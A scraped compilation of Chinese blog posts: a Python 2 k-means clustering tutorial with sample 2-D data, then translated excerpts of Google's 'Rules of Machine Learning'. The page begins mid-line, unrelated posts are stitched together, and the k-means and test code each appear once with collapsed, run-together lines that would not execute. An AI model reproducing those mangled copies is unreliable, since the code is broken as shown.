1], mark[markIndex])        mark = ['Dr', 'Db',
'Dg', 'Dk',
'^b', '+b',
'sb', 'db',
'<b', 'pb'] 
    # draw the centroids 
    for i in range(k): 
        plt.plot(centroids[i, 0], centroids[i,
1], mark[i], markersize = 12) 
      plt.show()  
#################################################
# kmeans: k-means cluster
# Author : zouxy
# Date   : 2013-12-25
# HomePage : http://blog.csdn.net/zouxy09
# Email  : zouxy09@qq.com
#################################################

from numpy import *
import time
import matplotlib.pyplot as plt


# calculate Euclidean distance
def euclDistance(vector1, vector2):
	return sqrt(sum(power(vector2 - vector1, 2)))

# init centroids with random samples
def initCentroids(dataSet, k):
	numSamples, dim = dataSet.shape
	centroids = zeros((k, dim))
	for i in range(k):
		index = int(random.uniform(0, numSamples))
		centroids[i, :] = dataSet[index, :]
	return centroids

# k-means cluster
def kmeans(dataSet, k):
	numSamples = dataSet.shape[0]
	# first column stores which cluster this sample belongs to,
	# second column stores the error between this sample and its centroid
	clusterAssment = mat(zeros((numSamples, 2)))
	clusterChanged = True

	## step 1: init centroids
	centroids = initCentroids(dataSet, k)

	while clusterChanged:
		clusterChanged = False
		## for each sample
		for i in xrange(numSamples):
			minDist  = 100000.0
			minIndex = 0
			## for each centroid
			## step 2: find the centroid who is closest
			for j in range(k):
				distance = euclDistance(centroids[j, :], dataSet[i, :])
				if distance < minDist:
					minDist  = distance
					minIndex = j
			
			## step 3: update its cluster
			if clusterAssment[i, 0] != minIndex:
				clusterChanged = True
				clusterAssment[i, :] = minIndex, minDist**2

		## step 4: update centroids
		for j in range(k):
			pointsInCluster = dataSet[nonzero(clusterAssment[:, 0].A == j)[0]]
			centroids[j, :] = mean(pointsInCluster, axis = 0)

	print 'Congratulations, cluster complete!'
	return centroids, clusterAssment

# show your cluster only available with 2-D data
def showCluster(dataSet, k, centroids, clusterAssment):
	numSamples, dim = dataSet.shape
	if dim != 2:
		print "Sorry! I can not draw because the dimension of your data is not 2!"
		return 1

	mark = ['or', 'ob', 'og', 'ok', '^r', '+r', 'sr', 'dr', '<r', 'pr']
	if k > len(mark):
		print "Sorry! Your k is too large! please contact Zouxy"
		return 1

	# draw all samples
	for i in xrange(numSamples):
		markIndex = int(clusterAssment[i, 0])
		plt.plot(dataSet[i, 0], dataSet[i, 1], mark[markIndex])

	mark = ['Dr', 'Db', 'Dg', 'Dk', '^b', '+b', 'sb', 'db', '<b', 'pb']
	# draw the centroids
	for i in range(k):
		plt.plot(centroids[i, 0], centroids[i, 1], mark[i], markersize = 12)

	plt.show()


三、测试结果
      测试数据是二维的，共80个样本。有4个类。如下：
testSet.txt



[python] 
view plaincopyprint?

1.658985    4.285136 
-3.453687   3.424321 
4.838138    -1.151539 
-5.379713   -3.362104 
0.972564    2.924086 
-3.567919   1.531611 
0.450614    -3.302219 
-3.487105   -1.724432 
2.668759    1.594842 
-3.156485   3.191137 
3.165506    -3.999838 
-2.786837   -3.099354 
4.208187    2.984927 
-2.123337   2.943366 
0.704199    -0.479481 
-0.392370   -3.963704 
2.831667    1.574018 
-0.790153   3.343144 
2.943496    -3.357075 
-3.195883   -2.283926 
2.336445    2.875106 
-1.786345   2.554248 
2.190101    -1.906020 
-3.403367   -2.778288 
1.778124    3.880832 
-1.688346   2.230267 
2.592976    -2.054368 
-4.007257   -3.207066 
2.257734    3.387564 
-2.679011   0.785119 
0.939512    -4.023563 
-3.674424   -2.261084 
2.046259    2.735279 
-3.189470   1.780269 
4.372646    -0.822248 
-2.579316   -3.497576 
1.889034    5.190400 
-0.798747   2.185588 
2.836520    -2.658556 
-3.837877   -3.253815 
2.096701    3.886007 
-2.709034   2.923887 
3.367037    -3.184789 
-2.121479   -4.232586 
2.329546    3.179764 
-3.284816   3.273099 
3.091414    -3.815232 
-3.762093   -2.432191 
3.542056    2.778832 
-1.736822   4.241041 
2.127073    -2.983680 
-4.323818   -3.938116 
3.792121    5.135768 
-4.786473   3.358547 
2.624081    -3.260715 
-4.009299   -2.978115 
2.493525    1.963710 
-2.513661   2.642162 
1.864375    -3.176309 
-3.171184   -3.572452 
2.894220    2.489128 
-2.562539   2.884438 
3.491078    -3.947487 
-2.565729   -2.012114 
3.332948    3.983102 
-1.616805   3.573188 
2.280615    -2.559444 
-2.651229   -3.103198 
2.321395    3.154987 
-1.685703   2.939697 
3.031012    -3.620252 
-4.599622   -2.185829 
4.196223    1.126677 
-2.133863   3.093686 
4.668892    -2.562705 
-2.793241   -2.149706 
2.884105    3.043438 
-2.967647   2.848696 
4.479332    -1.764772 
-4.905566   -2.911070 

1.658985	4.285136
-3.453687	3.424321
4.838138	-1.151539
-5.379713	-3.362104
0.972564	2.924086
-3.567919	1.531611
0.450614	-3.302219
-3.487105	-1.724432
2.668759	1.594842
-3.156485	3.191137
3.165506	-3.999838
-2.786837	-3.099354
4.208187	2.984927
-2.123337	2.943366
0.704199	-0.479481
-0.392370	-3.963704
2.831667	1.574018
-0.790153	3.343144
2.943496	-3.357075
-3.195883	-2.283926
2.336445	2.875106
-1.786345	2.554248
2.190101	-1.906020
-3.403367	-2.778288
1.778124	3.880832
-1.688346	2.230267
2.592976	-2.054368
-4.007257	-3.207066
2.257734	3.387564
-2.679011	0.785119
0.939512	-4.023563
-3.674424	-2.261084
2.046259	2.735279
-3.189470	1.780269
4.372646	-0.822248
-2.579316	-3.497576
1.889034	5.190400
-0.798747	2.185588
2.836520	-2.658556
-3.837877	-3.253815
2.096701	3.886007
-2.709034	2.923887
3.367037	-3.184789
-2.121479	-4.232586
2.329546	3.179764
-3.284816	3.273099
3.091414	-3.815232
-3.762093	-2.432191
3.542056	2.778832
-1.736822	4.241041
2.127073	-2.983680
-4.323818	-3.938116
3.792121	5.135768
-4.786473	3.358547
2.624081	-3.260715
-4.009299	-2.978115
2.493525	1.963710
-2.513661	2.642162
1.864375	-3.176309
-3.171184	-3.572452
2.894220	2.489128
-2.562539	2.884438
3.491078	-3.947487
-2.565729	-2.012114
3.332948	3.983102
-1.616805	3.573188
2.280615	-2.559444
-2.651229	-3.103198
2.321395	3.154987
-1.685703	2.939697
3.031012	-3.620252
-4.599622	-2.185829
4.196223	1.126677
-2.133863	3.093686
4.668892	-2.562705
-2.793241	-2.149706
2.884105	3.043438
-2.967647	2.848696
4.479332	-1.764772
-4.905566	-2.911070
测试代码：
test_kmeans.py



[python] 
view plaincopyprint?

################################################# 
# kmeans: k-means cluster  # Author : zouxy  
# Date   : 2013-12-25  # HomePage : http://blog.csdn.net/zouxy09 
# Email  : zouxy09@qq.com  ################################################# 
  from numpy import * 
import time  import matplotlib.pyplot as plt 
  ## step 1: load data  
print "step 1: load data..." 
dataSet = []  fileIn = open('E:/Python/Machine Learning in Action/testSet.txt') 
for line in fileIn.readlines(): 
    lineArr = line.strip().split('\t') 
    dataSet.append([float(lineArr[0]), float(lineArr[1])]) 
  ## step 2: clustering... 
print "step 2: clustering..." 
dataSet = mat(dataSet)  k = 4  centroids, clusterAssment = kmeans(dataSet, k)    ## step 3: show the result 
print "step 3: show the result..." 
showCluster(dataSet, k, centroids, clusterAssment)  

#################################################
# kmeans: k-means cluster
# Author : zouxy
# Date   : 2013-12-25
# HomePage : http://blog.csdn.net/zouxy09
# Email  : zouxy09@qq.com
#################################################

from numpy import *
import time
import matplotlib.pyplot as plt

## step 1: load data
print "step 1: load data..."
dataSet = []
fileIn = open('E:/Python/Machine Learning in Action/testSet.txt')
for line in fileIn.readlines():
	lineArr = line.strip().split('\t')
	dataSet.append([float(lineArr[0]), float(lineArr[1])])

## step 2: clustering...
print "step 2: clustering..."
dataSet = mat(dataSet)
k = 4
centroids, clusterAssment = kmeans(dataSet, k)

## step 3: show the result
print "step 3: show the result..."
showCluster(dataSet, k, centroids, clusterAssment)

运行的前后结果是：

不同的类用不同的颜色来表示，其中的大菱形是对应类的均值质心点。

四、算法分析
       k-means算法比较简单，但也有几个比较大的缺点：
（1）k值的选择是用户指定的，不同的k得到的结果会有挺大的不同，如下图所示，左边是k=3的结果，这个就太稀疏了，蓝色的那个簇其实是可以再划分成两个簇的。而右图是k=5的结果，可以看到红色菱形和蓝色菱形这两个簇应该是可以合并成一个簇的：

（2）对k个初始质心的选择比较敏感，容易陷入局部最小值。例如，我们上面的算法运行的时候，有可能会得到不同的结果，如下面这两种情况。K-means也是收敛了，只是收敛到了局部最小值：

（3）存在局限性，如下面这种非球状的数据分布就搞不定了：

（4）数据库比较大的时候，收敛会比较慢。
       k-means老早就出现在江湖了。所以以上的这些不足也被世人的目光敏锐的捕捉到，并融入世人的智慧进行了某种程度上的改良。例如问题（1）对k的选择可以先用一些算法分析数据的分布，如重心和密度等，然后选择合适的k。而对问题（2），有人提出了另一个成为二分k均值（bisecting k-means）算法，它对初始的k个质心的选择就不太敏感，这个算法我们下一个博文再分析和实现。










作者：黄永刚

ML Phase III: 缓慢提升、精细优化、复杂模型
第二阶段就已经接近结束了。首先你的月收益开始减少。你开始要在不同的指标之间做出平衡，你会发现有的涨了而有的却降了。事情变得有趣了。获取收益变得更难了，机器学习也已经变得更加复杂了。
警告：这一部分比前面有更多的理论虚的东西。我们见过很多团队在机器学习的一二阶段过得还是很愉快的。一旦进入第三阶段，他们就不得不寻找自己的出路了。
Rule #38: 如果目标没有变化就不要在新特征上浪费时间
随着评价进入平稳期，你的团队开始关注系统目标以外的其他问题。像以前的状态一样，如果已存的算法目标没有覆盖产品的目标，你就要改变你的目标或者产品的目标。例如，你或许优化点击、赞、下载，但是都是基于部分人类评委专家做决策的。
Rule #39: 基于产品长期目标做决策
Alice有个想法可以降低安装预测的逻辑损失。她加了一个特征。逻辑损失也降低了。当她做线上实验时，安装率也上升了。但是，当她做审议会议的时候，有人指出日活跃用户数下降了5%。小组没有上线这个模型。Alice比较失望，但是现在认识到做这个决定是基于很多准则的，而只有一部分是可以使用ML来优化的。
事实是真实世界不是地下城与龙：没有‘血量’表示你产品的健康程度。团队必须收集信息作出统计以尝试高效的预测出系统将来会成为什么样子。他们需要关注约定；日活跃用户数，30日活跃用户数，收益，广告商的投资回报。这些可以在自己系统里面使用A/B测试衡量的指标只是长期目标的一个间接衡量，既要满足用户需求，还要用户量的增长，满足合作方的要求，多赚取收益。
当左右指标都上升（至少不降低）时，最容易做决定了。如果团队要在复杂的机器学习算法和简单的启发式方法中选择，如果简单启发式方法能够在这些指标中做的更好，就应该选择它。而且，对于所有可能的指标之间也没有明确的优先级。考虑下面两个场景：



实验
日活跃用户数
日收益



A
1 百万
$4 百万


B
2 百万
$2 百万


如果当前系统是A，那么团队不可能转向B。如果当前系统是B，那团队不可能转向A。这可能和理性的行为是矛盾的。但是，改变指标后预测能不能成功不好说，因此存在巨大的风险。每一个都存在着风险。而且没有哪个指标可以说是最终的，“我的产品5年后是什么样子呢”？
个人来讲，另一方面倾向于可以直接优化的目标。大多的机器学习工具也倾向于这种情况，工程师也能够提取稳定特征。多目标学习问题从开始就强调这个问题。例如，可以针对每个指标建立一个有有约束的问题，之后将对于多个指标的问题结合起来一起优化。但是，并不是所有指标都是可以形成机器学习的目标函数。如果一个文档被点击了，或者一个APP被安装，是因为它们刚好被展示出来了。而且还很难找到为什么用户会访问你的网站。要对一个网站做整体的预测，这是很难的，就像计算机视觉和自然语言处理一样。
Rule #40: 使用简单模型做集成
使用原始数据并直接将内容进行排序，使用这种方式的模型都容易理解和调试。然而，如果讲这些模型集成起来效果会更好。为了尽可能保持简单，集成模型要么所有的输入是其他模型的输出，要么都是原始特征，最好不要两种都存在。而且要能够对这些基模型一起训练，否则会导致差的结果。
只将基模型的输出作为输入的集成最好使用简单的模型。这样也对集成模型性质有保证了。例如，基模型取得了增长，最起码不能集成之后的结果出现下降的情况。最好就是基模型可以某种意义上的解释，以便于基模型的变化不至于把集成模型搞混乱了。这样可以保证，基础分类器的预测概率增长在集成模型的概率上不会出现下降的情况。
Rule #41: 当性能进入瓶颈期，找其他信息源，而不是捣鼓已经有了的信息
你已经添加了用户人口信息，也添加过了文档的词组信息。也经过了模板摸索（指前面的两部分），也已经对正则化进行调节了。但是依然没有在关键指标上看到多于1%的性能提升。
那是时候采取一些激进的做法，对针对不同的特征采取其它方式。如从不同维度对用户在过去一天一周一年中的使用信息进行统计并形成文档。或者使用深度学习模型。根据投入估计期望，并相应的调整投入的精力。作为一个工程项目，你必须对添加新特征所增加的复杂度和增加的收益之间进行权衡。
Rule #42: 不要期盼多样性、个性化，或者相关性和受欢迎程度相关
追求多样性意味很多东西，需要种类多样的内容来源。个性化意味着每个用户都有各自的结果。关联性意味着对一个特定的查询须有特定恰当的结果。因此这三个属性和普通的共性是不同的。
还要一个问题，这种共性很难被打破。
如果你的系统正在度量点击、滞留时长、播放量、分享量等指标，其实你真正的是在度量内容的流行程度。有的时候，团队尝试学习多样性的个性模型。为了实现个性化，他们添加了一些特征想实现系统能够实现个性化（代表用户兴趣的特征）或者多样性，但最终会发现这些特征所获得的权重远远的低于他们期望得到的。
这不是说多样性，个性化等没有价值。如前面指出的规则一样，你可以做一些后处理来增加多样性等。如果在长期目标指数得到了增长，那你就可以说多样性或者其他相关性是有价值的了。也可以继续使用你的后处理，或基于多样性等相关性来直接修改目标函数。
Rule #43:  其他人对不同的产品倾向相似，但你或许不同于此
google团队已经使用另一个产品的模型在另一个产品上，并取得了较好的结果。你可能就遇到了这么一群小伙伴。另一方面，我见过一些团队试图在独立产品中作出个性化特征。是的，按理讲应该是可行的的，但是现在看来，并不是这样。使用一个属性的原始数据来预测另一个属性的行为，有的时候是可行的。要记住，即使知道一个用户在另一个属相上的历史行为对你来说都是有帮助的。
reference: 
- http://feisky.xyz/machine-learning/resources/rules_of_ml.html 
- Rules of Machine Learning: Best Practices for ML Engineering 









作者：黄永刚

机器学习规则:ML工程最佳实践
本文旨在指引具有机器学习基础知识的工程师等人，更好的从机器学习的实践中收益。介绍一些应用机器学习需要遵循的规则，类似于Google C++ 风格指南等流行的编程指南。如果你已经上过机器学习相关课程或者正在从事相关的工作，那你已经满足阅读本文所需的背景知识了。
Before Machine Learning

Rule: #1: 不要害怕开发没有应用机器学习技术的产品
Rule: #2: 设计评价指标并设立优先级
Rule: #3: 先使用复杂的启发式规则，然后选择机器学习方法

ML phase I : Your First Pipeline

Rule #4: 初版模型要简单，主要任务是确定系统流程的正确性
Rule #5: 系统运行状况要和算法的状况保持独立，以便之后算法迭代不会对系统造成较大影响。
Rule #6: 系统工作各阶段过度时，丢弃数据要谨慎
Rule #7: 寻找特征或者从外部补充其他相关数据

监控

Rule #8: 了解系统的时效性 

  算法运行对于数据的时效性有差异，如热榜需要每天更新数据，点击率预估更新部分数据频率更高。
Rule #9: 导出模型之前检测问题
Rule #10: 当心未被报告的失败 
  某些错误是不会有类似程序出错的异常，只会影响模型的性能，所以部署监控。
Rule #11: 文档化每个特征及其维护者

第一个目标

Rule #12: 不要过多的考虑优化指标的选择 

  起初的时候，只要选择正确的方法所有指标都会提升，没有必要刚开始对于指标的选择过多考虑。
Rule #13: 选择简单、可观察、可归因的指标作为第一个优化目标
Rule #14: 开始时使用可解释的模型，以便于调试
Rule #15: 对垃圾邮件过滤和质量排序，在策略上要区分开 
  对于垃圾邮件过滤，需要关注正反两类样本；但质量排序中只需要关注正常的样本，纵然也会存在违规、广告等，请记住，你的模型是排序，不是进行过滤。

ML Phase II: 特征工程（Feature Engineering）

Rule #16: 对模型重建和迭代做出规划
Rule #17: 开始时，使用可直接观察或者记录的特征（而不是算法学习得到的特征）
Rule #18: 挖掘能够在不同的上下文中泛化的特征
Rule #19: 尽可能使用具体的特征 

  如评价博文的热度，首选博文近几天的浏览量，而不是博文表达的主题是不是流行。
Rule #20: 使用可理解的方式修改或组合新特征 
  如 Titanic生还预测中，姐妹个数+孩子个数表示家庭人口大小。
Rule #21: 在线性模型中学习到的特征权重数量和使用到的数据量成比例
Rule #22: 清除掉不会再使用的特征

人工系统分析（Human Analysis of the System）

Rule #23: 你不能代表大多数的用户 

  所以你不能代表用户做判断模型的表现好坏，要做A/B Test。
Rule #24: 评估模型间的差异
Rule #25: 选择模型时，实用性比预测能力更重要 
  如果模型不能达到业务的性能要求，即使指标再高也不会让你上线的。
Rule #26: 观察模型误判的数据，寻找规律，抽取新特征
Rule #27: 量化观察到的不利行为
Rule #28: 注意区分短期行为和长期行为 
  如端午节很多人在购物中购买粽子，这并不代表这些人是个吃货，为此专门构造特征表示购买粽子的行为是不合适的。

训练偏差（Training-Serving Skew）

Rule #29: 为保证服务和训练效果相同，最好将服务时的特征集合保存以作训练
Rule #30: 对采样样本加权而不是随意丢弃
Rule #31: 模型训练之后才上线，在此过程中数据有可能已经发生变化 

  如果训练特征有一个特征表示博文的浏览量，那么等到模型训练完，浏览量已经发生变化了。
Rule #32: 尽可能在训练和服务时复用代码
Rule #33: 使用不同数据集做训练和测试
Rule #34: 在二值分类过滤中（垃圾邮件检测），不要为了纯净数据过大的牺牲性能
Rule #35: 认识排序问题中的固有偏差 
  如下载排行榜中靠前的APP在本质上就诱导用户下载
Rule #36: 避免位置特征的回馈循环
内容的位置会显著影响用户与它交互的可能性（置顶App的下载量通常下载量更大）
处理这类问题的有效方法是加入位置特征
注意要保持位置特征和其他特征的分离性
不要交叉（cross）位置特征
理想情况下，让模型变成位置特征函数和其他特征函数的和
Rule #37: 评估训练和服务之间的偏差

ML Phase III: 缓慢提升、精细优化、复杂模型

Rule #38: 如果优化目标没有包含此信息，就不要浪费时间在这些新特征上。
Rule #39: 基于多个指标做决策
Rule #40: 保持集成模型Simple
每个模型只能选择其一：只接收其他模型输入或只接收原始特征，不能两者兼有
Rule #41: 当性能平稳后，寻找新方向而不是精炼已有信息
Rule #42: 不要期望多样性、个性化和受欢迎程度有紧密联系
在以受欢迎程度为目标的系统上，多样性和个性化通常得到更低的权重
这并不是说多样性、个性化不重要，而是可以通过后处理来提高或者根据多样性和相关性改进目标
Rule #43: 其他人对不同的产品倾向相似，但你或许不同于此

术语（Terminology）：

实例（Instance）：针对其特性做出预测的事物，如，网页，你想判断它是不是和猫相关。
标签（Label）: 预测任务的结果，或者机器学习系统给出的答案，或训练数据提供的正确答案，如网页是与猫相关的。
特征（Feature）: 实例的属性，用来作出预测。如网页属性，是否包含单词‘猫’。
特征列（Feature Column）: 相关特征的集合，如人们居住国家的所有值的集合。实例在一个特征中可能出现多个相关值。1

概述
要做出好的产品：用优秀工程师的做法去做机器学习，而不是优秀机器学习专家那样。
你将面对的大多数问题事实上是工程问题。即使让所有优秀的机器学习专家来做，性能的提升大多还是来自好的特征，而不是好的机器学习算法。所以，基本的方法是： 
1. 确保管道可靠2。 
2. 开始于一个合理（reasonable）的目标。 
3. 用直观简单的方式添加经验性的特征。 
4. 确认管道依然可靠。 
当没有简单的方法可以使用了的时候，需要使用一些尖端的机器学习方法，可以参考第三部分。
这篇文章将会分为四个部分： 
1. 第一部分将帮助你理解是否需要建立一个机器学习系统。 
2. 第二部分关于部署你的第一个管道（Pipeline）。 
3. 第三部分关于系统的启动，当新特征加入系统时迭代，如何评估模型及训练和服务之间的偏差。 
4. 最后关于当系统停滞不前该如何处理。 
5. 之后，罗列一些相关的例子。   

Before Machine Learning
Rule #1 不要怕产品没有使用机器学习技术。
机器学习很炫酷，但是它需要数据。理论上，你可以从不同的问题中获得数据，之后为新产品调教出模型，但是这个效率就低于基础的启发式规则方法。如果机器学习可以给你100%的提升，那么启发式规则方法起码将得到50%。
举例来说，如果你要对应用市场中的APP进行排序，你可以使用安装量或者安装率。如果判断是否为垃圾邮件，过滤掉发送过垃圾邮件的地址。不要担心使用人工规则。如果你需要对联系人排序，按照联系频次排序或者字母顺序排序。如果你的产品不是完全需要机器学习，就不要使用它，除非你有充足的数据。
Rule #2 首先，设计和实现度量
在规划机器学习要做什么之前，记录当前使用的系统中尽可能多的信息。原因有以下几点： 
1. 从老系统用户处获取认可更容易一些。 
2. 对你认为将来有用的信息，最好现在开始记录。 
3. 如果你设计系统的时候，在心里已经有了对效果的衡量，那么以后的事情就会越来越好了。尤其，当你不希望自己去系统日志中寻找信息来实现你的度量指标时候。 
4. 你将能够注意到那些发生了变化哪些被保留了下来。举例来说，假如你在优化日活人数，基于老系统的操作情况，你或许注意到，用户体验的较大变化不会对此造成影响。
Google plus 团队统计了每个用户的阅读量、转发量、评论量等，他们利用这些来计算Post的质量。也可以用在整个实验当中，通过将用户分组，分组计算这些指标，这是非常重要的，原因参见Rule #12
多获取指标，你可以对你的系统有一个更宽泛的认识。如果发现问题，则增加一个指标对其进行跟踪。如果对最后一版的数量变化感兴趣，那就增加一个指标进行跟踪就好了。
Rule #3: 先使用复杂的启发式规则，然后选择机器学习方法
一个简单的启发式规则就可以使你的产品上线了。复杂启发式的系统很难维护，因此，一旦你有了数据，并对将要完成的事情有了基本的理解，就可以上机器学习了。如多数软件工程任务一样，无论是启发式规则还是机器学习方法，你都想持续的对它进行更新。你将会发现机器学习模型更加容易更新和维护。（参见Rule #16）
ML Phase I: Your First Pipeline
开发第一版系统时将精力集中在系统结构上。思考将要构建整个机器学习系统，是一件很有趣的事情。但刚开始就不能有一个可靠的系统信息流（pipeline），对于明白系统到底发生了什么将是一件困难的事情。
Rule #4: 初版模型要简单，设计正确的系统结构
第一版模型对于产品的提升是最大的，并不需要过多的考虑。但是在系统结构方面，遇到的困难比你预想的更大。在推出新的机器学习系统之前，你必须考虑一下事情： 
1. 算法学习所需的数据如何得到。 
2. 要大致的明白对于你的系统什么意味着好，什么意味坏。 
3. 如何将你的模型融合进你的应用中。要么在线应用模型，要么提前进行离线计算，将结果存到一张表里面（译注：离线计算或实时计算）。举例来说，通常是离线对网页进行分类，然后将结果存在表格里；或许也需要实时的对在线聊天信息进行分类。
选择简单的特征，这会使得以下事情的保证更加容易： 
1. 在算法里，正确的使用各个特征。 
2. 模型可以学习到合理的权重。 
3. 模型使用的特征在上线服务阶段也是正确的。
一旦你的系统在这三个方面是可靠的，你大部分工作就已经完成了。你这个简单模型也可以作为基准以方便尝试更加复杂的模型。一些开始就尝试复杂模型的团队在刚开始也会将从机器学习中获取收益的优先级调低，以避免混乱。
Rule #5: 确保系统结构的正确和算法的状况是独立的
确保系统结构是可以测试的，而且对于系统来说学习算法部分是封装着的，以便对其中的所有方面进行测试。尤其一下方面： 
1. 对获取数据并送入算法进行测试。检查特征的频度是否被继承了下来。如果允许，可以手动的去检查训练算法的输入。如果可以，统计系统流中的数据信息并和其他场景进行对比。 
2. 对于模型从训练算法中进行抽取进行测试。确保算法在实验环境和生产环境中能够能到相同的效果（参见Rule #37）.
机器学习有不可预测的一面，因此确保你已经对训练阶段和线上服务阶段的代码进行了测试；而且要保证在服务阶段能够将一个修正后的模型重新加载进来并工作正常。这对于理解你的数据是非常重要的：参见大规模复杂数据分析的实践建议。
Rule #6: 当复制别的系统流程时候，要当心丢失数据
我们经常开发pipeline时候，将原pipeline拷贝过来，但有时候原pipeline不需要而丢弃的数据在新的pipeline里面却是很有用的。Google plus 计算热榜的时候会将旧post丢弃（尝试计算出当前新的post）。这个pipeline就被拷贝之后用在了Google Plus Stream中，旧post仍然被丢弃掉了，然而在这个场景中旧post是很有用的。另一种普遍的场景，用户可见的历史记录，如果我们要对是否要展示特殊的post进行建模，那么所有的数据都是有用的，然而所有的负面post已经被删除掉了（译注：对判断帖子内容是否违规进行建模与删帖）。另一个相似的问题发生在工作Play Apps Home期间，开发的新pipeline包含了来自两个不同起始页的样例（Play Games Home and Play Home Home），没有任何特征对来源进行标识和区分。
Rule #7:
通常机器学习尝试解决的问题大多不是完全的新问题。，应该已经存在了一个系统来做分类或者排序等，任何你正在尝试解决的问题。这意味着已经有了一套规则和方法。这些方法对于你调节机器学习具有极大的帮助作用。相对于已有信息，需要探索的信息就比较少了，原因有两点，第一，系统之间的过度比较顺利不会出现大的变动；第二，原系统的规则包含了很多对于业务的认知，这些东西你不会愿意推倒重来。这里有四种方法利用已存的知识： 
1.使用原方法进行预处理。如果一个特征非常好，那么可以选择。举例来说，在垃圾邮件过滤中，如果一个邮件发送者已经进了黑名单，那么就不要再尝试重新学习获得黑名单了，直接拒收这些信息。这个方法在二值分类任务中非常重要。 
2. 新建特征。直接将原方法处理的结果作为一个特征加入当前算法。例如，如果你使用原方法计算查询的相关性评分，你可以将计算的评分作为一个新的特征的值。之后运用机器学习的处理方法对这个值进行微调（如离散化或者和其他特征结合），但开始的时候可以不处理直接使用原始值。 
3. 挖掘原方法的输入。如果对于APP原处理方法输入包含安装量、文本特征数、周活跃天数，那么可考虑单独的抽取去这些部分，分别应用到学习算法的输入中。应用集成方法的技巧可参考Rule # 40 
4. 改变标签。如果你觉得当前的标签没有标识原方法捕获到的信息，这个方法就可以考虑。例如，如果你正在优化下载量，但你也想保证内容的质量，那么或许你可以将标签乘以每个APP获得星的平均数。这里有很多空间可以发挥。可参考 “Your First Objective” 部分。
使用原方法对于整个机器学习系统来讲增加了系统的整体的复杂度，这一点你要能清晰的认识到。在新的机器学习系统中使用原方法可以使系统的过渡比较平滑，但是可以考虑一下是否有更加简单的方法实现相同的结果。
监控
通常，对于数据质量的预警非常必要，如可控的预警行为及控制界面（dashboard page）。
Rule #8: 了解系统对数据新鲜度要求
如果你模型数据都是前一天的，这到底对于性能的影响有多大？那一周前的呢？一个季度？这些信息会帮助你理解监控的重要性，如果模型有一天的滞后而损失了10%的收益，那么委派工程师进行持续的观察就十分必要了。大多的广告服务系统每天要处理很多的新广告，必须每天进行更新。例如，如果Google Play的搜索ML模型没有更新，那么月收益就会收到影响；如果Google Plus的热榜模型没有新的post识别特征，那么模型抽取的频率就会下降。其他具有这些新特征的模型就会更新的很快。随着时间的变化，模型对于数据新鲜度的要求也会发生变化，尤其当一些特征被加进来或者被剔除的时候。
Rule #9: 模型抽取之前进行检查
很多机器学习系统在抽取模型并上线提供服务的时候都有这个阶段。如果抽取的模型存在问题，这可是直接面向用户的。如果这个问题以前就有，那就是训练问题，当然用户也不会注意到的。
在模型抽取之前做合理性检查。尤其要确保模型在提取出的数据中表现是合理的；要不，如果你还在考虑数据，那就不要抽取模型。很多团队抽取模型之前都会利用AUC进行检查。没有抽取之前的模型，针对可能存在的问题做一个邮件预警就可以，但是如果是已经直面用户的模型的问题就需要做一个页面了。所以在直面用户之前最好不要着急，慢慢来。
Rule #10: 当心未被报告的失败
这个问题相比较于其他类型的系统中，在机器学习系统中发生的更加频繁。假如要用到一个不会被更新的表，机器学习系统会自己调节，进而产生的行为看起来也挺合理，只不过会缓慢的过时。过了一段时间发现很久没有更新了，然后更新了一下，或许获得的性能提升比其他花了一个季度工作时间的提升都要大。例如，一个特征的覆盖率根据实现的变化会发生变化：一个特征一直覆盖率90%，忽然降到了60%，一次Google Play有一个6个月的旧表，单独的更新了这个表就在安装率上获得了2%的提升。如果你一直跟踪数据的统计信息，或者随机的手动检查这些数据，就能减少类似的失败发生。
Rule #11: 给出每个特征的负责人和特征文档
如果系统非常庞大，有很多的特征，要知道谁创建和维护每个特征。如果某个特征的负责人员要离职，那么确保其他人知道这个事情。虽然每个特征都有其特定的名称，但是最好还是给出一个特征的详细说明出来，阐述一下从哪里获取，有什么样的作用。
第一个目标
应用场景有很多的关系的计量指标，但你的机器学习算法通常只需要一个来进行优化。这里要区分一下指标和目标，指标是关于你系统报告的一个数值，或许重要或者不重要。参考 Rule #2.
Rule #12: 对优化目标的选择不要考虑太多
你想多赚钱，想增加用户体验，想世界变得更加美好。有太多关心的衡量指标，你应该对这些进行衡量。然而机器学习过程的开始阶段，你会发现所有指标即使你没有直接优化的，也会一起上升。例如，你关心点击量、用户逗留时间、日活跃用户量。如果优化点击数，你可能会发现用户逗留时间也在增长。
所以，当你还可以较早的提升所有指标的时候，简单点不要过多的考虑不同衡量指标之间的权衡。当然，也不要将这个方法一直贯彻下去，以免扰乱了你最终的目标：整个系统最终的表现（参见Rule #39）。如果你发现自己提升了直接的优化指标，但决定了不向外推出这个模型，那么优化目标的改变就很必要了。
Rule #13: 选择一个简单、可见、可归因的指标作为第一个目标
通常你并不知道真正的目标是什么。你会认为你自己知道，然后盯着数据，同时去分析新旧两个系统，你认为你该调整它。还有，不同的小组成员在真正的目标上是不能达成共识的。机器学习的目标应该是容易度量的，是真正的目标的一种间接指标。所以，在简单的目标上进行训练，然后考虑在这个模型之上加上一个‘逻辑层’，可以允许你添加一些逻辑（期望是简单逻辑）进去用于做出最终的排序。
对于行为相关的系统，模型可用的可直接观察和可归因的最简单的就是用户行为了： 
1. 排序的链接是否被点击？ 
2. 排序的对象是否被下载？ 
3. 排序的对象是否被转发/回复? 
4. 排序的对象是否被评价？ 
5. 展示的内容被标识为垃圾/色情/侮辱？
首先应该避免对间接的效果进行建模： 
1. 明天用户是不是继续访问？ 
2. 用户多久访问一次？ 
3. 日活跃用户到底是些什么人？
间接效果可以是很好的指标，可被用在A/B测试中或者判断模型是否应该上线中。
最后，不要尝试使用机器学习来搞清楚： 
1. 用户使用产品是否高兴？ 
2. 用户的产品体验是否满意？ 
3. 产品是否提高了用户的整体幸福感？ 
4. 这个怎么影响整个公司的形象？
这些东西也重要，但是也太不可思议了。因此，使用间接指标：如果一个用户高兴，它在站点的滞留时间就越久。如果用户满意，它很可能明天继续访问。对于用户的幸福感和公司的形象，就需要人为的判断了，产品的本质好坏，公司的计划等。
Rule14: 开始时候使用交互式模型，这样debugg容易些。
线性回归、逻辑回归、泊松回归都来源于概率模型。每预测都可以被理解为一种概率或者期望值。这使得它们debug比其它使用如0-1损失、hinge losses等更加容易，它们直接优化的是分类精度或者排序性能。例如，如果训练结果概率不同于其它预测是概率，这就说明存在问题了。
例如，在线性回归、逻辑回归、泊松回归中，有一部分数据预测值的期望均值等于标签的平均值。如果一个实例的特征是0-1特征，则特征是1的实例就被校准。如果所有实例的某个特征都为1，则需要对所有实例进行校准了。
